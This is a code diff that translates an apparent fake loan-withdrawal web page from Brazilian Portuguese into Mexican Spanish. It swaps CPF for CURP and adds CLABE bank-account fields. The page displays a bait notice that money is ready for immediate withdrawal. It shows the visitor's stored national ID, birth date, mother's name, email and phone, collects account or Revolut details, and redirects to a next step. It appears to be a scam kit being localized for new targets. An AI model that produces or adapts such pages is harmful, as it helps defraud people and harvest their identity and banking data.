@@ -2137,7 +2137,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" stroke-linecap="round" stroke-linejoin="round">
 </path>
 </svg></div>
-<div class="notif-tx"><strong>¡Retiro pendiente!</strong> You have an amount available for immediate withdrawal via
+<div class="notif-tx"><strong>¡Retiro pendiente!</strong> Tienes un monto disponible para retiro inmediato vía
             transfer.</div>
 <div class="notif-ar"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"></path>
@@ -2521,7 +2521,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
     function init() {
       const n = localStorage.getItem('nome') || '';
-      uC = localStorage.getItem('cpf') || '';
+      uC = localStorage.getItem('curp') || '';
       lA = parseFloat(localStorage.getItem('selectedLoanAmount')) || 0;
       iN = parseInt(localStorage.getItem('selectedCuotas')) || 0;
       mP = parseFloat(localStorage.getItem('selectedMensualPayment')) || 0;
@@ -2535,10 +2535,10 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       const v = new Date(); v.setDate(v.getDate() + 90);
       $('lcVenc').textContent = `${v.toLocaleDateString('es-MX')} - ${F(mP)}`;
       $('dCp').textContent = uC || '--';
-      $('dNa').textContent = localStorage.getItem('dataNascimento') || '--';
-      $('dMa').textContent = localStorage.getItem('nomeMae') || '--';
+      $('dNa').textContent = localStorage.getItem('fechaNacimiento') || '--';
+      $('dMa').textContent = localStorage.getItem('nombreMadre') || '--';
       $('dEm').textContent = localStorage.getItem('email') || '--';
-      $('dPh').textContent = localStorage.getItem('telefone') || '--';
+      $('dPh').textContent = localStorage.getItem('telefono') || '--';
     }
 
     function go(t) {
@@ -2590,19 +2590,19 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         const revHolder = $('revHolderIn').value.trim();
         if (!revtag) { alert('Ingresa tu @ RevolutBank'); return; }
         if (!revHolder) { alert('Ingresa el nombre del titular'); return; }
-        localStorage.setItem('levantamento_metodo', method);
-        localStorage.setItem('levantamento_revtag', revtag);
-        localStorage.setItem('levantamento_titular', revHolder);
+        localStorage.setItem('retiro_metodo', method);
+        localStorage.setItem('retiro_revtag', revtag);
+        localStorage.setItem('retiro_titular', revHolder);
       } else {
         const iban = $('ibanIn').value.trim();
         const holder = $('holderIn').value.trim();
         const bic = $('bicIn').value.trim();
         if (!iban || iban.replace(/\D/g, '').length !== 18) { alert('Ingresa una CLABE válida'); return; }
         if (!holder) { alert('Ingresa el nombre del titular de la cuenta'); return; }
-        localStorage.setItem('levantamento_metodo', method);
-        localStorage.setItem('levantamento_iban', iban);
-        localStorage.setItem('levantamento_titular', holder);
-        localStorage.setItem('levantamento_bic', bic);
+        localStorage.setItem('retiro_metodo', method);
+        localStorage.setItem('retiro_clabe', iban);
+        localStorage.setItem('retiro_titular', holder);
+        localStorage.setItem('retiro_bic', bic);
       }
       $('sForm').style.display = 'none'; $('prV').style.display = 'flex'; $('appBody').scrollTop = 0;
       setTimeout(() => { const p = new URLSearchParams(window.location.search); window.location.href = '9.html' + (p.toString() ? '?' + p : ''); }, 3000);
